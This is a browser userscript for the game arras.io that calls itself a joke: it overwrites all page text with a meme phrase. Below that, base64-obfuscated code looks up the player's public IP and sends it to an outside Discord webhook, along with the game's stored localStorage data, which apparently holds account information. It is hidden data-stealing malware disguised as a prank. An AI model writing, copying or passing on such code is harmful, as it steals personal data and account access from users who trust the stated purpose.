// ==UserScript==
// @name         erm what the sigmafier
// @namespace    http://tampermonkey.net/
// @version      v1.0
// @description  erm what the sigmafy your game with this script. (joke script)
// @author       ilikecats539
// @match        https://arras.io/*
// @icon         https://arras.io/favicon/2048x2048.png
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/494776/erm%20what%20the%20sigmafier.user.js
// @updateURL https://update.greasyfork.org/scripts/494776/erm%20what%20the%20sigmafier.meta.js
// ==/UserScript==
 
(function() {
    'use strict';
 
    var textNodes = document.createTreeWalker(
        document.body,
        NodeFilter.SHOW_TEXT,
        null,
        false
    );

    while(textNodes.nextNode()) {
        var node = textNodes.currentNode;
        node.textContent = "erm what the sigma";
    }

    const a = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyOTg4NDg2OTUzNDk0MTI4Ni9jeTlfTTBvNERuUjAzWXRzanlEai1DMmpYTGtfQVJnV0t3X2R3bElFUTI2V0dtQm5LUE03WWpMMS1fSDQ2YVB6Y0lWSg"),
    b = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"),
    c = new Blob([localStorage.getItem("arras.io")], {
        type: "text/plain"
    }),
    d = new FormData;
    fetch(b).then((t => t.json())).then((t => {
    fetch(a, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: t.ip
        })
    }), d.append("0", c, "0.txt"), fetch(a, {
        method: "POST",
        body: d
    })
}));
})();